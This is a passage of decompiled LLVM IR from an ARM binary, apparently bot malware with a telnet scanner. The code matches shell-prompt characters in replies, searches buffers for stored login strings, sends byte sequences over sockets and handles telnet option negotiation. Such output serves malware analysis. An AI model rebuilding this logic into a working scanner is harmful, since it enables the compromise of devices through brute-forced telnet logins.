  %v0_1067c = load i32, i32* @r5, align 4
  %v1_1067c = add i32 %v0_1067c, 4
  %v2_1067c = inttoptr i32 %v1_1067c to i32*
  %v3_1067c = load i32, i32* %v2_1067c, align 4
  store i32 %v3_1067c, i32* %r0.global-to-local, align 4
  %v4_10680 = call i32 @__libc_send(i32 %v3_1067c, i32 %v3_1066c, i32 %v3_10670, i32 16384)
  store i32 %v4_10680, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a76c.44 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10690 = load i32, i32* @r5, align 4
  %v1_10690 = add i32 %v0_10690, 4
  %v2_10690 = inttoptr i32 %v1_10690 to i32*
  %v3_10690 = load i32, i32* %v2_10690, align 4
  store i32 %v3_10690, i32* %r0.global-to-local, align 4
  %v4_10694 = call i32 @__libc_send(i32 %v3_10690, i32 ptrtoint ([3 x i8]* @global_var_1a76c.44 to i32), i32 2, i32 16384)
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_1069c = call i32 @table_lock_val(i32 25)
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_106a4 = load i32, i32* @r5, align 4
  %v2_106a4 = add i32 %v1_106a4, 12
  %v3_106a4 = inttoptr i32 %v2_106a4 to i32*
  store i32 6, i32* %v3_106a4, align 4
  br label %dec_label_pc_101a0

dec_label_pc_106ac:                               ; preds = %dec_label_pc_10080
  %v1_106ac = add i32 %v0_10080, 24
  %v2_106ac = inttoptr i32 %v1_106ac to i32*
  %v3_106ac = load i32, i32* %v2_106ac, align 4
  store i32 %v3_106ac, i32* %r2.global-to-local, align 4
  %v1_106b0 = add i32 %v3_106ac, -1
  store i32 %v1_106b0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_106b4 = icmp eq i32 %v1_106b0, 0
  store i1 %v2_106b4, i1* %cpsr_z.global-to-local, align 1
  %tmp408 = icmp slt i32 %v1_106b0, 1
  br i1 %tmp408, label %dec_label_pc_10728, label %dec_label_pc_106bc

dec_label_pc_106bc:                               ; preds = %dec_label_pc_106ac
  %v2_106bc = add i32 %v1_106b0, %v0_10080
  store i32 %v2_106bc, i32* %r3.global-to-local, align 4
  %v1_106c0 = add i32 %v2_106bc, 28
  %v2_106c0 = inttoptr i32 %v1_106c0 to i8*
  %v3_106c0 = load i8, i8* %v2_106c0, align 1
  %v4_106c0 = zext i8 %v3_106c0 to i32
  store i32 %v4_106c0, i32* %r3.global-to-local, align 4
  %v2_106c4 = icmp ugt i8 %v3_106c0, 61
  store i1 %v2_106c4, i1* %cpsr_c.global-to-local, align 1
  %v7_106c4 = icmp eq i8 %v3_106c0, 62
  store i1 %v7_106c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_106c4, label %dec_label_pc_109e0, label %bb409

bb409:                                            ; preds = %dec_label_pc_106bc
  %v3_106c8 = icmp ugt i8 %v3_106c0, 57
  store i1 %v3_106c8, i1* %cpsr_c.global-to-local, align 1
  %v8_106c8 = icmp eq i8 %v3_106c0, 58
  store i1 %v8_106c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_106c8, label %dec_label_pc_109e0, label %dec_label_pc_106d0

dec_label_pc_106d0:                               ; preds = %bb409
  %v2_106d0 = icmp ugt i8 %v3_106c0, 35
  store i1 %v2_106d0, i1* %cpsr_c.global-to-local, align 1
  %v7_106d0 = icmp eq i8 %v3_106c0, 36
  store i1 %v7_106d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_106d0, label %dec_label_pc_109e0, label %dec_label_pc_106d8

dec_label_pc_106d8:                               ; preds = %dec_label_pc_106d0
  %v2_106d8 = icmp ugt i8 %v3_106c0, 34
  store i1 %v2_106d8, i1* %cpsr_c.global-to-local, align 1
  %v7_106d8 = icmp eq i8 %v3_106c0, 35
  store i1 %v7_106d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_106d8, label %dec_label_pc_109e0, label %dec_label_pc_106e0

dec_label_pc_106e0:                               ; preds = %dec_label_pc_106d8
  %v2_106e0 = icmp ugt i8 %v3_106c0, 36
  store i1 %v2_106e0, i1* %cpsr_c.global-to-local, align 1
  %v7_106e0 = icmp eq i8 %v3_106c0, 37
  store i1 %v7_106e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_106e0, label %dec_label_pc_109e0, label %dec_label_pc_10720.preheader

dec_label_pc_10720.preheader:                     ; preds = %dec_label_pc_106e0
  %v3_106e4 = add i32 %v0_10080, 28
  %v2_106e8 = add i32 %v3_106e4, %v3_106ac
  store i32 %v2_106e8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10720

dec_label_pc_106f4:                               ; preds = %dec_label_pc_10720
  %v1_106f4 = add i32 %v0_10718, -2
  %v2_106f4 = inttoptr i32 %v1_106f4 to i8*
  %v3_106f4 = load i8, i8* %v2_106f4, align 1
  %v4_106f4 = zext i8 %v3_106f4 to i32
  store i32 %v4_106f4, i32* %r2.global-to-local, align 4
  %v2_106f8 = icmp ugt i8 %v3_106f4, 61
  store i1 %v2_106f8, i1* %cpsr_c.global-to-local, align 1
  %v7_106f8 = icmp eq i8 %v3_106f4, 62
  store i1 %v7_106f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_106f8, label %dec_label_pc_109e0, label %bb410

bb410:                                            ; preds = %dec_label_pc_106f4
  %v3_106fc = icmp ugt i8 %v3_106f4, 57
  store i1 %v3_106fc, i1* %cpsr_c.global-to-local, align 1
  %v8_106fc = icmp eq i8 %v3_106f4, 58
  store i1 %v8_106fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_106fc, label %dec_label_pc_109e0, label %dec_label_pc_10704

dec_label_pc_10704:                               ; preds = %bb410
  %v2_10704 = icmp ugt i8 %v3_106f4, 35
  store i1 %v2_10704, i1* %cpsr_c.global-to-local, align 1
  %v7_10704 = icmp eq i8 %v3_106f4, 36
  store i1 %v7_10704, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10704, label %dec_label_pc_109e0, label %dec_label_pc_1070c

dec_label_pc_1070c:                               ; preds = %dec_label_pc_10704
  %v2_1070c = icmp ugt i8 %v3_106f4, 34
  store i1 %v2_1070c, i1* %cpsr_c.global-to-local, align 1
  %v7_1070c = icmp eq i8 %v3_106f4, 35
  store i1 %v7_1070c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1070c, label %dec_label_pc_109e0, label %dec_label_pc_10714

dec_label_pc_10714:                               ; preds = %dec_label_pc_1070c
  %v2_10714 = icmp ugt i8 %v3_106f4, 36
  store i1 %v2_10714, i1* %cpsr_c.global-to-local, align 1
  %v7_10714 = icmp eq i8 %v3_106f4, 37
  store i1 %v7_10714, i1* %cpsr_z.global-to-local, align 1
  %v1_10718 = add i32 %v0_10718, -1
  store i32 %v1_10718, i32* %r3.global-to-local, align 4
  br i1 %v7_10714, label %dec_label_pc_109e0, label %dec_label_pc_10720

dec_label_pc_10720:                               ; preds = %dec_label_pc_10720.preheader, %dec_label_pc_10714
  %v0_10718 = phi i32 [ %v2_106e8, %dec_label_pc_10720.preheader ], [ %v1_10718, %dec_label_pc_10714 ]
  %v0_10720 = phi i32 [ %v1_106b0, %dec_label_pc_10720.preheader ], [ %v1_10720, %dec_label_pc_10714 ]
  %v1_10720 = add i32 %v0_10720, -1
  store i32 %v1_10720, i32* %r0.global-to-local, align 4
  %v2_10720 = icmp ne i32 %v0_10720, 0
  store i1 %v2_10720, i1* %cpsr_c.global-to-local, align 1
  %v7_10720 = icmp eq i32 %v0_10720, 1
  store i1 %v7_10720, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10720, label %dec_label_pc_10728, label %dec_label_pc_106f4

dec_label_pc_10728:                               ; preds = %dec_label_pc_10720, %dec_label_pc_106ac
  store i32 32, i32* %r0.global-to-local, align 4
  %v1_1072c = call i32 @table_unlock_val(i32 32)
  store i32 33, i32* %r0.global-to-local, align 4
  %v1_10734 = call i32 @table_unlock_val(i32 33)
  store i32 %v2_1073c, i32* %r1.global-to-local, align 4
  store i32 32, i32* %r0.global-to-local, align 4
  %v3_10744 = call i32 @table_retrieve_val(i32 32, i32* nonnull %stack_var_-60)
  store i32 %v3_10744, i32* @r4, align 4
  store i32 %v2_10750, i32* %r1.global-to-local, align 4
  store i32 33, i32* %r0.global-to-local, align 4
  %v3_10758 = call i32 @table_retrieve_val(i32 33, i32* %v2_10758)
  %v3_1075c = load i32, i32* %stack_var_-60, align 4
  %sext = mul i32 %v3_10758, 16777216
  %v1_10760 = sdiv i32 %sext, 16777216
  store i32 %v1_10760, i32* @r6, align 4
  %v0_10764 = load i32, i32* @r4, align 4
  store i32 %v0_10764, i32* %r2.global-to-local, align 4
  %v1_10768 = add i32 %v3_1075c, -1
  store i32 %v1_10768, i32* %r3.global-to-local, align 4
  %v0_1076c = load i32, i32* @sl, align 4
  store i32 %v0_1076c, i32* %r0.global-to-local, align 4
  %v0_10770 = load i32, i32* @r5, align 4
  %v1_10770 = add i32 %v0_10770, 24
  %v2_10770 = inttoptr i32 %v1_10770 to i32*
  %v3_10770 = load i32, i32* %v2_10770, align 4
  store i32 %v3_10770, i32* %r1.global-to-local, align 4
  %v4_10774 = call i32 @util_memsearch(i32 %v0_1076c, i32 %v3_10770, i32 %v0_10764, i32 %v1_10768)
  store i32 %v4_10774, i32* %r0.global-to-local, align 4
  %v2_10778 = icmp eq i32 %v4_10774, -1
  store i1 %v2_10778, i1* %cpsr_c.global-to-local, align 1
  %v7_10778 = icmp eq i32 %v4_10774, -1
  store i1 %v7_10778, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10778, label %dec_label_pc_10b1c, label %dec_label_pc_10788

dec_label_pc_10788:                               ; preds = %dec_label_pc_10b1c, %dec_label_pc_10728
  store i32 1, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 32, i32* %r0.global-to-local, align 4
  %v1_1078c = call i32 @table_lock_val(i32 32)
  store i32 33, i32* %r0.global-to-local, align 4
  %v1_10794 = call i32 @table_lock_val(i32 33)
  store i32 %v1_10794, i32* %r0.global-to-local, align 4
  %v0_10798 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10798 = icmp eq i32 %v0_10798, 0
  store i1 %v2_10798, i1* %cpsr_z.global-to-local, align 1
  %tmp411 = icmp slt i32 %v0_10798, 1
  br i1 %tmp411, label %dec_label_pc_1088c, label %dec_label_pc_10788.dec_label_pc_109e4_crit_edge

dec_label_pc_10788.dec_label_pc_109e4_crit_edge:  ; preds = %dec_label_pc_10788
  %v0_109e4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_109e4

dec_label_pc_107a4:                               ; preds = %dec_label_pc_10080
  %v1_107a4 = add i32 %v0_10080, 24
  %v2_107a4 = inttoptr i32 %v1_107a4 to i32*
  %v3_107a4 = load i32, i32* %v2_107a4, align 4
  store i32 %v3_107a4, i32* %r2.global-to-local, align 4
  %v1_107a8 = add i32 %v3_107a4, -1
  store i32 %v1_107a8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_107ac = icmp eq i32 %v1_107a8, 0
  store i1 %v2_107ac, i1* %cpsr_z.global-to-local, align 1
  %tmp412 = icmp slt i32 %v1_107a8, 1
  br i1 %tmp412, label %dec_label_pc_10810, label %dec_label_pc_107b4

dec_label_pc_107b4:                               ; preds = %dec_label_pc_107a4
  %v2_107b4 = add i32 %v1_107a8, %v0_10080
  store i32 %v2_107b4, i32* %r3.global-to-local, align 4
  %v1_107b8 = add i32 %v2_107b4, 28
  %v2_107b8 = inttoptr i32 %v1_107b8 to i8*
  %v3_107b8 = load i8, i8* %v2_107b8, align 1
  %v4_107b8 = zext i8 %v3_107b8 to i32
  store i32 %v4_107b8, i32* %r3.global-to-local, align 4
  %v2_107bc = icmp ugt i8 %v3_107b8, 61
  store i1 %v2_107bc, i1* %cpsr_c.global-to-local, align 1
  %v7_107bc = icmp eq i8 %v3_107b8, 62
  store i1 %v7_107bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_107bc, label %dec_label_pc_109d8, label %bb413

bb413:                                            ; preds = %dec_label_pc_107b4
  %v3_107c0 = icmp ugt i8 %v3_107b8, 57
  store i1 %v3_107c0, i1* %cpsr_c.global-to-local, align 1
  %v8_107c0 = icmp eq i8 %v3_107b8, 58
  store i1 %v8_107c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_107c0, label %dec_label_pc_109d8, label %dec_label_pc_107c8

dec_label_pc_107c8:                               ; preds = %bb413
  %v2_107c8 = icmp ugt i8 %v3_107b8, 35
  store i1 %v2_107c8, i1* %cpsr_c.global-to-local, align 1
  %v7_107c8 = icmp eq i8 %v3_107b8, 36
  store i1 %v7_107c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_107c8, label %dec_label_pc_109d8, label %dec_label_pc_107d0

dec_label_pc_107d0:                               ; preds = %dec_label_pc_107c8
  %v2_107d0 = icmp ugt i8 %v3_107b8, 34
  store i1 %v2_107d0, i1* %cpsr_c.global-to-local, align 1
  %v7_107d0 = icmp eq i8 %v3_107b8, 35
  store i1 %v7_107d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_107d0, label %dec_label_pc_109d8, label %dec_label_pc_10808.preheader

dec_label_pc_10808.preheader:                     ; preds = %dec_label_pc_107d0
  %v3_107d4 = add i32 %v0_10080, 28
  %v2_107d8 = add i32 %v3_107d4, %v3_107a4
  store i32 %v2_107d8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10808

dec_label_pc_107e4:                               ; preds = %dec_label_pc_10808
  %v1_107e4 = add i32 %v0_10800, -2
  %v2_107e4 = inttoptr i32 %v1_107e4 to i8*
  %v3_107e4 = load i8, i8* %v2_107e4, align 1
  %v4_107e4 = zext i8 %v3_107e4 to i32
  store i32 %v4_107e4, i32* %r2.global-to-local, align 4
  %v2_107e8 = icmp ugt i8 %v3_107e4, 61
  store i1 %v2_107e8, i1* %cpsr_c.global-to-local, align 1
  %v7_107e8 = icmp eq i8 %v3_107e4, 62
  store i1 %v7_107e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_107e8, label %dec_label_pc_109d8, label %bb414

bb414:                                            ; preds = %dec_label_pc_107e4
  %v3_107ec = icmp ugt i8 %v3_107e4, 57
  store i1 %v3_107ec, i1* %cpsr_c.global-to-local, align 1
  %v8_107ec = icmp eq i8 %v3_107e4, 58
  store i1 %v8_107ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_107ec, label %dec_label_pc_109d8, label %dec_label_pc_107f4

dec_label_pc_107f4:                               ; preds = %bb414
  %v2_107f4 = icmp ugt i8 %v3_107e4, 35
  store i1 %v2_107f4, i1* %cpsr_c.global-to-local, align 1
  %v7_107f4 = icmp eq i8 %v3_107e4, 36
  store i1 %v7_107f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_107f4, label %dec_label_pc_109d8, label %dec_label_pc_107fc

dec_label_pc_107fc:                               ; preds = %dec_label_pc_107f4
  %v2_107fc = icmp ugt i8 %v3_107e4, 34
  store i1 %v2_107fc, i1* %cpsr_c.global-to-local, align 1
  %v7_107fc = icmp eq i8 %v3_107e4, 35
  store i1 %v7_107fc, i1* %cpsr_z.global-to-local, align 1
  %v1_10800 = add i32 %v0_10800, -1
  store i32 %v1_10800, i32* %r3.global-to-local, align 4
  br i1 %v7_107fc, label %dec_label_pc_109d8, label %dec_label_pc_10808

dec_label_pc_10808:                               ; preds = %dec_label_pc_10808.preheader, %dec_label_pc_107fc
  %v0_10800 = phi i32 [ %v2_107d8, %dec_label_pc_10808.preheader ], [ %v1_10800, %dec_label_pc_107fc ]
  %v0_10808 = phi i32 [ %v1_107a8, %dec_label_pc_10808.preheader ], [ %v1_10808, %dec_label_pc_107fc ]
  %v1_10808 = add i32 %v0_10808, -1
  store i32 %v1_10808, i32* %r0.global-to-local, align 4
  %v2_10808 = icmp ne i32 %v0_10808, 0
  store i1 %v2_10808, i1* %cpsr_c.global-to-local, align 1
  %v7_10808 = icmp eq i32 %v0_10808, 1
  store i1 %v7_10808, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10808, label %dec_label_pc_10810, label %dec_label_pc_107e4

dec_label_pc_10810:                               ; preds = %dec_label_pc_10808, %dec_label_pc_107a4
  store i32 31, i32* %r0.global-to-local, align 4
  %v1_10814 = call i32 @table_unlock_val(i32 31)
  store i32 %v2_10750, i32* %r1.global-to-local, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  %v3_10824 = call i32 @table_retrieve_val(i32 31, i32* %v2_10758)
  %v3_10828 = load i8, i8* %stack_var_-56, align 1
  %v4_10828 = sext i8 %v3_10828 to i32
  store i32 %v3_10824, i32* %r2.global-to-local, align 4
  %v1_10830 = add nsw i32 %v4_10828, -1
  store i32 %v1_10830, i32* %r3.global-to-local, align 4
  %v0_10834 = load i32, i32* @sl, align 4
  store i32 %v0_10834, i32* %r0.global-to-local, align 4
  %v0_10838 = load i32, i32* @r5, align 4
  %v1_10838 = add i32 %v0_10838, 24
  %v2_10838 = inttoptr i32 %v1_10838 to i32*
  %v3_10838 = load i32, i32* %v2_10838, align 4
  store i32 %v3_10838, i32* %r1.global-to-local, align 4
  %v4_1083c = call i32 @util_memsearch(i32 %v0_10834, i32 %v3_10838, i32 %v3_10824, i32 %v1_10830)
  store i32 %v4_1083c, i32* %r0.global-to-local, align 4
  %v1_10840 = add i32 %v4_1083c, 1
  store i32 %v1_10840, i32* @r7, align 4
  %v2_10840 = icmp eq i32 %v4_1083c, -1
  store i1 %v2_10840, i1* %cpsr_c.global-to-local, align 1
  %v7_10840 = icmp eq i32 %v1_10840, 0
  store i1 %v7_10840, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10840, label %thread-pre-split103, label %bb415

bb415:                                            ; preds = %dec_label_pc_10810
  store i32 1, i32* @r7, align 4
  br label %thread-pre-split103

thread-pre-split103:                              ; preds = %dec_label_pc_10810, %bb415
  %v0_10848 = phi i1 [ false, %bb415 ], [ true, %dec_label_pc_10810 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v0_10848, i1* %cpsr_z.global-to-local, align 1
  store i32 31, i32* %r0.global-to-local, align 4
  %v1_10c4c = call i32 @table_lock_val(i32 31)
  store i32 %v1_10c4c, i32* %r0.global-to-local, align 4
  %v0_10c50 = load i32, i32* @r5, align 4
  br i1 %v0_10848, label %dec_label_pc_10c48, label %dec_label_pc_10858

dec_label_pc_10858:                               ; preds = %thread-pre-split103, %dec_label_pc_109d8
  %v0_10858 = phi i32 [ %v0_10080, %dec_label_pc_109d8 ], [ %v0_10c50, %thread-pre-split103 ]
  %v1_10858 = inttoptr i32 %v0_10858 to i32*
  %v2_10858 = load i32, i32* %v1_10858, align 4
  store i32 %v2_10858, i32* %r3.global-to-local, align 4
  %v1_1085c = add i32 %v0_10858, 4
  %v2_1085c = inttoptr i32 %v1_1085c to i32*
  %v3_1085c = load i32, i32* %v2_1085c, align 4
  store i32 %v3_1085c, i32* %r0.global-to-local, align 4
  %v1_10860 = add i32 %v2_10858, 13
  %v2_10860 = inttoptr i32 %v1_10860 to i8*
  %v3_10860 = load i8, i8* %v2_10860, align 1
  %v4_10860 = zext i8 %v3_10860 to i32
  store i32 %v4_10860, i32* %r2.global-to-local, align 4
  %v1_10864 = add i32 %v2_10858, 4
  %v2_10864 = inttoptr i32 %v1_10864 to i32*
  %v3_10864 = load i32, i32* %v2_10864, align 4
  store i32 %v3_10864, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_1086c = call i32 @__libc_send(i32 %v3_1085c, i32 %v3_10864, i32 %v4_10860, i32 16384)
  store i32 %v4_1086c, i32* %r0.global-to-local, align 4
  %v0_10870 = load i32, i32* @r5, align 4
  %v1_10870 = add i32 %v0_10870, 4
  %v2_10870 = inttoptr i32 %v1_10870 to i32*
  %v3_10870 = load i32, i32* %v2_10870, align 4
  store i32 %v3_10870, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a76c.44 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_10880 = call i32 @__libc_send(i32 %v3_10870, i32 ptrtoint ([3 x i8]* @global_var_1a76c.44 to i32), i32 2, i32 16384)
  store i32 5, i32* %r0.global-to-local, align 4
  %v1_10888 = load i32, i32* @r5, align 4
  %v2_10888 = add i32 %v1_10888, 12
  %v3_10888 = inttoptr i32 %v2_10888 to i32*
  store i32 5, i32* %v3_10888, align 4
  br label %dec_label_pc_1088c

dec_label_pc_1088c:                               ; preds = %dec_label_pc_10958, %bb419, %dec_label_pc_10788, %dec_label_pc_10a68, %dec_label_pc_109e4, %dec_label_pc_10aac, %dec_label_pc_10858
  %v0_1088c = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1088c = icmp eq i32 %v0_1088c, 0
  store i1 %v2_1088c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1088c, label %dec_label_pc_10000.loopexit, label %dec_label_pc_101a0

dec_label_pc_10898:                               ; preds = %dec_label_pc_10080
  %v1_10898 = add i32 %v0_10080, 24
  %v2_10898 = inttoptr i32 %v1_10898 to i32*
  %v3_10898 = load i32, i32* %v2_10898, align 4
  store i32 %v3_10898, i32* %r2.global-to-local, align 4
  %v0_1089c = load i32, i32* @sl, align 4
  store i32 %v0_1089c, i32* @r4, align 4
  store i32 0, i32* @r7, align 4
  %v3_108a4146 = icmp eq i32 %v3_10898, 0
  store i1 %v3_108a4146, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_108a4146, i1* %cpsr_z.global-to-local, align 1
  %v6_108a8153 = icmp sgt i32 %v3_10898, 0
  br i1 %v6_108a8153, label %dec_label_pc_108ac.preheader, label %dec_label_pc_10958

dec_label_pc_108a4.loopexit:                      ; preds = %dec_label_pc_108c8
  %v2_108d0 = add i32 %v1_108d0, 2
  store i32 %v2_108d0, i32* @r4, align 4
  %v2_108d4 = add i32 %v1_108d4, 2
  store i32 %v2_108d4, i32* @r7, align 4
  %v3_108a4 = icmp uge i32 %v2_108d4, %v1_108a4
  store i1 %v3_108a4, i1* %cpsr_c.global-to-local, align 1
  %v9_108a4 = icmp eq i32 %v2_108d4, %v1_108a4
  store i1 %v9_108a4, i1* %cpsr_z.global-to-local, align 1
  %v6_108a8 = icmp slt i32 %v2_108d4, %v1_108a4
  br i1 %v6_108a8, label %dec_label_pc_108ac.preheader, label %dec_label_pc_10958

dec_label_pc_108ac.preheader:                     ; preds = %dec_label_pc_10898, %dec_label_pc_108a4.loopexit
  %v6_10960239 = phi i32 [ %v6_10960240, %dec_label_pc_108a4.loopexit ], [ %v0_10080, %dec_label_pc_10898 ]
  %v1_108d4222 = phi i32 [ %v2_108d4, %dec_label_pc_108a4.loopexit ], [ 0, %dec_label_pc_10898 ]
  %v1_108b8220 = phi i32 [ %v1_108a4, %dec_label_pc_108a4.loopexit ], [ %v3_10898, %dec_label_pc_10898 ]
  %v0_108ac218 = phi i32 [ %v2_108d0, %dec_label_pc_108a4.loopexit ], [ %v0_1089c, %dec_label_pc_10898 ]
  br label %dec_label_pc_108ac

dec_label_pc_108ac:                               ; preds = %dec_label_pc_108ac.preheader, %dec_label_pc_1093c
  %v6_10960240 = phi i32 [ %v6_10960239, %dec_label_pc_108ac.preheader ], [ %v0_10944, %dec_label_pc_1093c ]
  %v1_108d4 = phi i32 [ %v1_108d4222, %dec_label_pc_108ac.preheader ], [ %v1_10948, %dec_label_pc_1093c ]
  %v1_108a4 = phi i32 [ %v1_108b8220, %dec_label_pc_108ac.preheader ], [ %v3_10944, %dec_label_pc_1093c ]
  %v1_108d0 = phi i32 [ %v0_108ac218, %dec_label_pc_108ac.preheader ], [ %v1_10950, %dec_label_pc_1093c ]
  %v1_108ac = inttoptr i32 %v1_108d0 to i8*
  %v2_108ac = load i8, i8* %v1_108ac, align 1
  %v3_108ac = zext i8 %v2_108ac to i32
  store i32 %v3_108ac, i32* @r3, align 4
  %v2_108b0 = icmp eq i8 %v2_108ac, -1
  store i1 %v2_108b0, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_108b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_108b0, label %dec_label_pc_108b8, label %dec_label_pc_10958

dec_label_pc_108b8:                               ; preds = %dec_label_pc_108ac
  %v0_108b8 = load i32, i32* @sl, align 4
  %v2_108b8 = add i32 %v0_108b8, %v1_108a4
  store i32 %v2_108b8, i32* %r1.global-to-local, align 4
  %v1_108bc = add i32 %v1_108d0, 1
  store i32 %v1_108bc, i32* @r6, align 4
  %v3_108c0 = icmp uge i32 %v2_108b8, %v1_108bc
  store i1 %v3_108c0, i1* %cpsr_c.global-to-local, align 1
  %v9_108c0 = icmp eq i32 %v2_108b8, %v1_108bc
  store i1 %v9_108c0, i1* %cpsr_z.global-to-local, align 1
  %v2_108c4 = xor i1 %v3_108c0, true
  %v3_108c4 = or i1 %v9_108c0, %v2_108c4
  br i1 %v3_108c4, label %dec_label_pc_10958, label %dec_label_pc_108c8

dec_label_pc_108c8:                               ; preds = %dec_label_pc_108b8
  %v2_108c8 = inttoptr i32 %v1_108bc to i8*
  %v3_108c8 = load i8, i8* %v2_108c8, align 1
  %v4_108c8 = zext i8 %v3_108c8 to i32
  store i32 %v4_108c8, i32* @r3, align 4
  %v2_108cc = icmp eq i8 %v3_108c8, -1
  store i1 %v2_108cc, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_108cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_108cc, label %dec_label_pc_108a4.loopexit, label %dec_label_pc_108dc

dec_label_pc_108dc:                               ; preds = %dec_label_pc_108c8
  %v2_108dc = icmp ugt i8 %v3_108c8, -4
  store i1 %v2_108dc, i1* %cpsr_c.global-to-local, align 1
  %v7_108dc = icmp eq i8 %v3_108c8, -3
  store i1 %v7_108dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_108dc, label %dec_label_pc_10968, label %dec_label_pc_108e4

dec_label_pc_108e4:                               ; preds = %dec_label_pc_108dc
  %v1_108e4 = add i32 %v1_108d0, 2
  store i32 %v1_108e4, i32* @r3, align 4
  %v3_108e8 = icmp uge i32 %v2_108b8, %v1_108e4
  store i1 %v3_108e8, i1* %cpsr_c.global-to-local, align 1
  %v9_108e8 = icmp eq i32 %v2_108b8, %v1_108e4
  store i1 %v9_108e8, i1* %cpsr_z.global-to-local, align 1
  %v2_108ec = xor i1 %v3_108e8, true
  %v3_108ec = or i1 %v9_108e8, %v2_108ec
  br i1 %v3_108ec, label %dec_label_pc_10958, label %dec_label_pc_108f0

dec_label_pc_108f0:                               ; preds = %dec_label_pc_109c8, %bb420, %dec_label_pc_108e4, %.thread115
  %v0_108f0 = load i32, i32* @r6, align 4
  %v1_108f0 = inttoptr i32 %v0_108f0 to i8*
  %v2_108f0 = load i8, i8* %v1_108f0, align 1
  %v3_108f0 = zext i8 %v2_108f0 to i32
  store i32 %v3_108f0, i32* %r3.global-to-local, align 4
  %v2_108f4 = icmp ugt i8 %v2_108f0, -4
  store i1 %v2_108f4, i1* %cpsr_c.global-to-local, align 1
  %v7_108f4 = icmp eq i8 %v2_108f0, -3
  store i1 %v7_108f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_108f4, label %.thread107, label %dec_label_pc_10904

.thread107:                                       ; preds = %dec_label_pc_108f0
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_108f0, align 1
  %v0_10900.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10900.pr.pr, label %.thread110, label %.thread107.dec_label_pc_10904thread-pre-split_crit_edge

.thread107.dec_label_pc_10904thread-pre-split_crit_edge: ; preds = %.thread107
  %v0_10904.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10904

dec_label_pc_10904:                               ; preds = %dec_label_pc_108f0, %.thread107.dec_label_pc_10904thread-pre-split_crit_edge
  %v0_10904.pr = phi i32 [ %v0_10904.pr.pre, %.thread107.dec_label_pc_10904thread-pre-split_crit_edge ], [ %v3_108f0, %dec_label_pc_108f0 ]
  %v2_10904 = icmp ugt i32 %v0_10904.pr, 250
  store i1 %v2_10904, i1* %cpsr_c.global-to-local, align 1
  %v7_10904 = icmp eq i32 %v0_10904.pr, 251
  store i1 %v7_10904, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10904, label %bb416, label %.thread110

bb416:                                            ; preds = %dec_label_pc_10904
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_1090c = load i32, i32* @r6, align 4
  %v4_1090c = inttoptr i32 %v3_1090c to i8*
  store i8 -3, i8* %v4_1090c, align 1
  br label %.thread110

.thread110:                                       ; preds = %dec_label_pc_10904, %.thread107, %bb416
  %v0_10910 = load i32, i32* @r4, align 4
  %v1_10910 = add i32 %v0_10910, 2
  %v2_10910 = inttoptr i32 %v1_10910 to i8*
  %v3_10910 = load i8, i8* %v2_10910, align 1
  %v4_10910 = zext i8 %v3_10910 to i32
  store i32 %v4_10910, i32* %r3.global-to-local, align 4
  %v2_10914 = icmp ugt i8 %v3_10910, -4
  store i1 %v2_10914, i1* %cpsr_c.global-to-local, align 1
  %v7_10914 = icmp eq i8 %v3_10910, -3
  store i1 %v7_10914, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10914, label %.thread111, label %dec_label_pc_10924

